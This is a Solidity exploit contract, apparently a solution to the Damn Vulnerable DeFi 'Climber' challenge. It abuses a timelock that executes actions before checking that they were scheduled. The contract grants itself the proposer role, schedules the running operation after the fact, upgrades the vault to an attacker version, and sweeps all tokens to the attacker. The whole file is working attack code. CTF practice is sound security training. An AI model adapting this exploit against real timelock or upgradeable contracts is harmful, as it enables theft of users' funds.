// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "./AttackVault.sol";
import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {ClimberVault} from "../../../src/Contracts/climber/ClimberVault.sol";

// solution from : https://www.youtube.com/watch?v=9WDYLOhElrA
contract AttackTimelock {
    address vault;
    address payable timelock;
    address token;

    address owner;

    bytes[] private scheduleData;
    address[] private to;

    constructor(address _vault, address payable _timelock, address _token, address _owner) {
        vault = _vault;
        timelock = _timelock;
        token = _token;
        owner = _owner;
    }

    function setScheduleData(address[] memory _to, bytes[] memory data) external {
        to = _to;
        scheduleData = data;
    }

    function exploit() external {
        uint256[] memory emptyData = new uint256[](to.length);
        // this exploit function is the last to be called in the scedule
        // and since this contract is already now in the PROPOSER_ROLE
        // it can directly add the scedule ensuring that the execute call
        // does not revert
        // see  -> (require(getOperationState(id) == OperationState.ReadyForExecution)
        ClimberTimelock(timelock).schedule(to, emptyData, scheduleData, 0);

        // at this point the vault is already updated to the attack version
        // with the public setSweeper function :)
        AttackVault(vault).setSweeper(address(this));
        // sweepFunds will transfer all DVT tokens to this contract
        AttackVault(vault).sweepFunds(token);
    }

    function withdraw() external {
        require(msg.sender == owner, "not owner");
        DamnValuableToken(token).transfer(owner, DamnValuableToken(token).balanceOf(address(this)));
    }
}
